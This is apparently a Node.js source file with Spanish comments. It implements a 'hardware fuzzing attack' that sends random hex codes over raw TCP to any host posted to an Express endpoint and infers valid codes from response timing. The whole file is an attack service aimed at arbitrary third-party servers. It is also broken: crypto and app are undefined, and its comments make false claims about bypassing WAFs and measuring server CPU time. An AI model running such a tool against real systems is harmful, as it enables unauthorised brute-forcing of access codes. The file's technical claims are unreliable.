// serverless.js - Fuzzing de Nivel Inferior (TCP Directo)
const net = require('net');
const { performance } = require('perf_hooks');

const HARDWARE_CONFIG = {
  reintentos: 10, // Máximo de conexiones simultáneas para saturar el buffer
  delayPromedio: 50, // Retraso en ms (extremadamente bajo para hardware real)
  timeout: 200 // Timeout para conectar al socket
};

/**
 * Estrategia: Fuzzing de Hardware
 * 1. Conexión TCP Directa: Ignora HTTP, WAFs, y latencia de red.
 * 2. Envío de Bytes Puros: Enviamos la cadena directamente al buffer del socket.
 * 3. Medición de CPU: Medimos el tiempo que la CPU tarda en procesar el socket.
 */
async function ataqueFuzzingHardware(url) {
  console.log(`[Hardware Attack] Target: ${url}`);
  
  // Parsear dominio y puerto (asumiendo puerto 80 o 443)
  const partes = url.split(':');
  const puerto = partes[1] || 80;
  const host = partes[0];
  
  // Generar códigos de prueba
  const codigos = [];
  for(let i=0; i<100; i++) {
    codigos.push(crypto.randomBytes(4).toString('hex')); // 8 caracteres hex
  }
  
  let resultadoOptimo = null;
  let tiempoMasRapido = Infinity;
  
  // 1. Medir "Baseline" de CPU (Tiempo para procesar el socket vacío)
  const baseline = await medirTareaCPU(host, puerto, "");
  console.log(`Baseline Hardware: ${baseline}ms (Tiempo base del socket)`);
  
  // 2. Probar cada código de forma agresiva
  for (const codigo of codigos) {
    // Medir tiempo de CPU para procesar el código
    const tiempoConCodigo = await medirTareaCPU(host, puerto, codigo);
    
    // Calcular la diferencia real de procesamiento (ignorando la red)
    const deltaCPU = tiempoConCodigo - baseline;
    
    // Si el servidor valida código y cambia el tiempo de procesamiento
    if (Math.abs(deltaCPU) > 0.1) { // 0.1ms es el límite de precisión de performance.now()
        console.log(`Código: ${codigo} -> Delta CPU: ${deltaCPU.toFixed(4)}ms`);
        
        if (deltaCPU < tiempoMasRapido) {
            tiempoMasRapido = deltaCPU;
            resultadoOptimo = codigo;
        }
    }
  }
  
  return {
    metodo: "Hardware Fuzzing",
    resultado: resultadoOptimo || "No se detectó delta CPU",
    delta: tiempoMasRapido
  };
}

/**
 * Función que abre un socket TCP y ejecuta el código directamente
 * Ignora todo el overhead de HTTP y Red
 */
function medirTareaCPU(host, puerto, payload) {
  return new Promise((resolve, reject) => {
    const tiempoInicio = performance.now();
    
    const socket = new net.Socket();
    
    socket.setTimeout(HARDWARE_CONFIG.timeout);
    
    socket.on('connect', () => {
      // Enviamos el payload crudo
      socket.write(payload);
    });
    
    socket.on('data', (data) => {
      // El servidor responde en el mismo socket
      // No hacemos nada con los datos, solo cerramos
    });
    
    socket.on('end', () => {
      const tiempoFin = performance.now();
      socket.destroy();
      resolve(tiempoFin - tiempoInicio);
    });
    
    socket.on('error', (err) => {
      reject(err);
    });
    
    // Iniciar conexión
    socket.connect(puerto, host);
  });
}

app.post('/fuzzing-hardware', async (req, res) => {
    try {
        const { url } = req.body;
        const resultado = await ataqueFuzzingHardware(url);
        res.json(resultado);
    } catch (error) {
        res.status(500).json({ error: "Hardware Failure", detalle: error.message });
    }
});

app.listen(3000, () => console.log('Hardware Attack Layer: Listening'));
